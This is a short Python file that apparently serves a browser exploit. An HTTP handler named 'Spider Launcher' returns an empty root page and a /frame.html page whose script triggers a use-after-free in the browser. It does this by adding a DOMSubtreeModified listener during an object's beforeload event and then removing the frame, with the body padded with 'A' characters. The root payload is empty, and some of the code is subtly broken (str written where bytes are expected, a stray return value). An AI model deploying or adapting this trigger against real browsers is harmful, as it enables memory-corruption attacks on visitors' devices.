
from time import time as now
try:
    from http.server import BaseHTTPRequestHandler
except ImportError:
    from BaseHTTPServer import BaseHTTPRequestHandler


class SpiderLauncherServer(BaseHTTPRequestHandler):
    server_version = 'Spider Launcher/1.0'

    def do_GET(self):
        print('GET', self.path)
        if not self.path:
            self.send_response(301)
            self.send_header('Location', '/')
            self.end_headers()
            return
        elif self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Last-Modified', self.date_time_string(now()))
            response_text = ''
            self.send_header('Content-Length', len(response_text))
            self.end_headers()
            self.wfile.write(response_text)
            return
        elif self.path == '/frame.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Last-Modified', self.date_time_string(now()))
            response_text = '''<html>
    <head>
        <script>
            var nb = 0;
            function handleBeforeLoad() {
                if (++nb == 1) {
                    p.addEventListener('DOMSubtreeModified', parent.dsm, false);
                } else if (nb == 2) {
                    p.removeChild(f);
                }
            }

            function documentLoaded() {
                f = window.frameElement;
                p = f.parentNode;
                var o = document.createElement("object");
                o.addEventListener('beforeload', handleBeforeLoad, false);
                document.body.appendChild(o);
            }

            window.onload = documentLoaded;
        </script>
    </head>
    <body>
        AAAAAAAAA...
    </body>
</html>'''
            self.send_header('Content-Length', len(response_text))
            self.end_headers()
            self.wfile.write(response_text)
            return
        self.send_error(404, "File not found")
        return 'hello world'
